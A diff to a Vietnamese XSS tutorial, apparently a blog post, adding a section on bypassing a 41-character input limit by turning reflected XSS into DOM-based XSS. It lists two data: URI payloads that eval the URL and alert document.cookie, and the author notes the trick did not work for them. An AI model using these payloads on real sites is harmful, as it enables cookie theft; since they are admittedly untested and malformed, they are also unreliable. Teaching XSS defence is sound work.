@@ -196,6 +196,18 @@ Bypass bằng \”, kí tự \ đầu tiên sẽ triệt tiêu hiệu quả củ
 
 <h3>Giới hạn số lượng đầu vào</h3>
 
+<img src="/images/XSS-la-gi/10.png" />
+Mục đích của đoạn mã: Nhận tham số name từ URL thông qua $_GET, sau đó giới hạn độ dài chuỗi đầu vào tối đa 41 ký tự và hiển thị kết quả.
+
+Bypass: Chuyển Reflected XSS thành DOM based XSS
+
+( Mình test thử cách này méo hoạt động nên không recomment cách này lắm )
+```html 
+data:text/html,eval(unescape(location)#%0Aalert(document.cookie)
+
+data:text/html,<script>alert(document./*&age=*/cookie)</script>
+
+```
 
 
 
